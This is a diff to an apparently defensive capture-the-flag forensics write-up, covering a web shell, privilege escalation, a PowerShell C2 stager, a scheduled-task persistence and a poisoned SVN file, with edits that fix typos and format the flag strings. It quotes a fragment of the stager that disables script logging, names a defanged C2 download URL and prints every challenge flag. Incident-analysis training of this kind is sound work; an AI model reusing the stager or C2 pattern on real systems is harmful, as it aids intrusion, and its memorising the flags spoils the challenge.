@@ -14,10 +14,10 @@ There are interesting queries in the webserver access logs. This is one of the e
 
 ![](screenshots/1.png)
 
-The flag is ther urlencoded.
+The flag is there urlencoded.
 
 # Flag WebProbe
-flag{def_1_7e7b364a9671dc7eb51415d302474689}
+`flag{def_1_7e7b364a9671dc7eb51415d302474689}`
 
 # Webshell
 
@@ -37,7 +37,7 @@ echo base64_decode('ZmxhZ3tkZWZfMl85YmY0').hex2bin('30393035').strrev('}36d71c8b
 ```
 
 # Flag WebShell
-flag{def_2_9bf4090599b7bc7d6130d3feb8c17d63}
+`flag{def_2_9bf4090599b7bc7d6130d3feb8c17d63}`
 
 # Privesc
 
@@ -50,7 +50,7 @@ The former is turning off the antivirus, the latter is a binary that can be used
 ![](screenshots/2.png)
 
 # Flag Privesc
-flag{def_3_38adb16bf4985ab3dd135d236c804941}
+`flag{def_3_38adb16bf4985ab3dd135d236c804941}`
 
 # C2
 
@@ -67,7 +67,7 @@ If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType('System.Ma
 While the first thing the script does is to turn off scriptblock logging, there were leftovers. This event log was not deleted like System either. The script is downloading encrypted data from the `http://192.168.248[.]133:8080/admin/get.php` C2 server. `$u` contains the flag in the code.
 
 # Flag C2#1
-flag{def_4_dd0711788d0095025fe4afedffbe7331}
+`flag{def_4_dd0711788d0095025fe4afedffbe7331}`
 
 # Autoruns
 Checking [Autoruns](https://learn.microsoft.com/hu-hu/sysinternals/downloads/autoruns) reveals the `\Updater` scheduled task.
@@ -109,7 +109,7 @@ Checking the descriptor `c:\Windows\System32\Tasks\Updater` reveals the next com
 ![](screenshots/5.png)
 
 # Flag C2#2
-flag{def_5_3e02c5f1767a16cfc6bb89ddde54a8bd}
+`flag{def_5_3e02c5f1767a16cfc6bb89ddde54a8bd}`
 
 # SVN
 There are multiple signs that this is a development machine (svn, nodejs).
@@ -136,11 +136,11 @@ Upon closer look, this is am obfuscated, out of place file.
 
 ![](screenshots/7.png)
 
-Quick analyzis reveals it is dropping the flag in the user directory (`userHomeDir`, `flag6.txt`, `flag{def_6...`)
+Quick analysis reveals it is dropping the flag in the user directory (`userHomeDir`, `flag6.txt`, `flag{def_6...`)
 
 Can be checked with [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) during runtime. The flag is under `c:\Users\Administrator\flag6.txt`.
 
 ![](screenshots/8.png)
 
 # Flag Poison
-flag{def_6_2faeee9ac1871c8f17c55c2050cf2899}
+`flag{def_6_2faeee9ac1871c8f17c55c2050cf2899}`
